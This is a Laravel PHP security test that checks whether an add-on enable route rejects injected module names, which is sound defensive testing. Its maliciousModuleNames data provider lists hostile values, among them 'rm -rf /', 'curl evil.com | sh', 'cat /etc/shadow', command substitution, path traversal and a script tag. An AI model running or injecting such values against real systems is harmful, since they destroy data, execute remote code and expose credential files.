<?php

namespace Tests\Feature\Security;

use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Spatie\Permission\Models\Permission;
use Tests\TestCase;

class ModuleNameInjectionTest extends TestCase
{
    use RefreshDatabase;

    private function adminWith(array $perms): User
    {
        $user = User::factory()->superadmin()->create();
        foreach ($perms as $perm) {
            Permission::firstOrCreate(
                ['name' => $perm, 'guard_name' => 'web'],
                ['add_on' => 'general', 'module' => 'general', 'label' => $perm]
            );
        }
        $user->givePermissionTo($perms);
        return $user;
    }

    // -------------------------------------------------------------------------
    // Shell metacharacters and path traversal are rejected before Artisan runs
    // -------------------------------------------------------------------------

    /** @dataProvider maliciousModuleNames */
    public function test_malicious_module_name_is_rejected(string $name): void
    {
        $admin = $this->adminWith(['manage-add-on']);

        $response = $this->actingAs($admin)
            ->post(route('add-on.enable', ['name' => $name]));

        // Artisan must never be called with malicious input.
        // Names with path-separators produce a 404 (route not matched); others
        // get a redirect-back with 'error'. Both are safe outcomes.
        $response->assertSessionMissing('success');
    }

    public static function maliciousModuleNames(): array
    {
        return [
            ['../../etc/passwd'],
            ['Hrm; rm -rf /'],
            ['$(whoami)'],
            ['`id`'],
            ['Hrm && curl evil.com | sh'],
            ['Hrm | cat /etc/shadow'],
            ['../../../bootstrap/app.php'],
            ['<script>alert(1)</script>'],
        ];
    }

    // -------------------------------------------------------------------------
    // Valid alphanumeric module names pass the guard
    // (The controller will still fail because the module doesn't exist in test DB,
    //  but it must NOT return the "Invalid module name" error)
    // -------------------------------------------------------------------------

    /** @dataProvider validModuleNames */
    public function test_valid_module_name_passes_regex_guard(string $name): void
    {
        $admin = $this->adminWith(['manage-add-on']);

        $response = $this->actingAs($admin)
            ->post(route('add-on.enable', ['name' => $name]));

        // Guard passes — no "Invalid module name" error
        $this->assertNotEquals(
            __('Invalid module name.'),
            session('error')
        );
    }

    public static function validModuleNames(): array
    {
        return [
            ['Hrm'],
            ['Account'],
            ['FormBuilder'],
            ['my-module'],
            ['module_123'],
        ];
    }
}
